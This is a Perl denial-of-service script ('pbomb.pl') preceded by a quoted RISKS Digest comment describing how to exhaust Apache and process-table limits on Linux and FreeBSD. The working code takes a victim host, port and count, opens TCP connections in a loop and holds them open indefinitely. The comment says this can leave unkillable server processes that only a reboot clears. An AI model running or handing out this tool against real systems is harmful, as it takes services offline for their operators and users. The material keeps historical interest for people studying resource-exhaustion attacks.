########################
#!/usr/bin/perl
###########################################################################
#Subject: Re: Process table attack (from RISKS Digest)
#
#Apache is also quite vulnerable, at least to a http DOS... It's pretty
#asy to swamp it by opening HARD_SERVER_LIMIT connections.
#
#It's also usually unnecessary to use a root-spawned daemon for the attack,
#as long as you can find more than one listening daemon.  The per-user
#limit is often something like 1/2 the size of the process table.  I know
#that under Linux it is by default (MAX_TASKS_PER_USER = NR_TASKS/2).
#
#in experimentation, I found that there was no need to use multiple
#that needed to be done on FreeBSD was increase MAX_OPEN.  On Linux,
#NR_OPEN and MAX_OPEN needed to be increased.  You might also have to
#fiddle with /proc/sys/kernel/file-max and ulimit.
#
#On a related note, on a Linux machine with Apache's HARD_SERVER_LIMIT
#higher than Linux' MAX_TASKS_PER_USER it'll do some pretty interesting
#stuff.  You'll end up with a couple hundred instances of Apache that are
#unkillable by any method, all sitting on port 80 and not responding to
#anything beyond the inital connection.  The only solution that I know if
#is to reboot at that point...
##########################################################################
#-------------------- pbomb.pl --------------------

use Socket;

# opens a lot of connections to a given port on a given machine
# by unknown
# create a local filehandle so's not to mess up the namespace.  connect it to
# the server you want to die and leave it alone...

sub connect_me {
   local *FH;
   my $iaddr = gethostbyname('localhost');
   my $proto = getprotobyname('tcp');
   my $paddr = sockaddr_in(0, $iaddr);
   my($host);
   my $hisiaddr = inet_aton($victim)     || die "unknown host";
   my $hispaddr = sockaddr_in($port, $hisiaddr);
   socket(FH, PF_INET, SOCK_STREAM, $proto)   || die "socket: $!";
   connect(FH, $hispaddr)          || die "bind: $!";
   # return the filehandle so it doesn't get wiped
   return *FH;
}
if (scalar @ARGV != 3) {
   print "usage: pbomb.pl <victim> <port> <count>\n";
   exit(0);
}
$victim = $ARGV[0];
$port = $ARGV[1];
$max = $ARGV[2];

$count = 0;
while (1) {
   push @handles, &connect_me;
   $count++;
   $staggered and sleep 3;
   if ($count == $max) {
      while (1) {
         sleep 1;
      }
   }
}

